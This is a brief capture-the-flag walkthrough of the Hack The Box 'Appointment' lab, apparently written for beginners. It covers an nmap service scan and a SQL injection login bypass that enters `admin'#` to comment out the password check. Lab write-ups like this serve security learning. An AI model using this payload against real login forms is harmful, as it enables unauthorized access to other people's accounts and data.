# Appointment_HTB

IP: `10.129.3.141`


# Solution

First few questions can be googled so google it and learn because without learning just copy pasting stuff won't work.

For owasp question visit this [link](https://owasp.org/Top10/), Answer is `A03:2021-Injection`

Now let's do a classic stuff, *NMAP SCAN!*

```bash
sudo nmap -sV {IP}
```

`-sV - flag to get version of services`

Output -

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

`Apache httpd 2.4.38 ((Debian))` is running on port `80`. 


### Let's Just not waste time and open the ip address in browser

we will get a login form, most of companies use sql as there database and they don't filter the input user has given to them.

So let's use `#` to comment out sql command which is used in the backend

```bash
select * from users where username={username} and password={password};
```

if we pust `'#` in username and password anything random, Then after the command will something look like.

```bash
select * from users where username=''#' and password=123;
```

But a good practice is to add `admin'#` so you can enter as a admin.


```bash
select * from users where username='admin'#' and password=123;
```

and You got in congrats.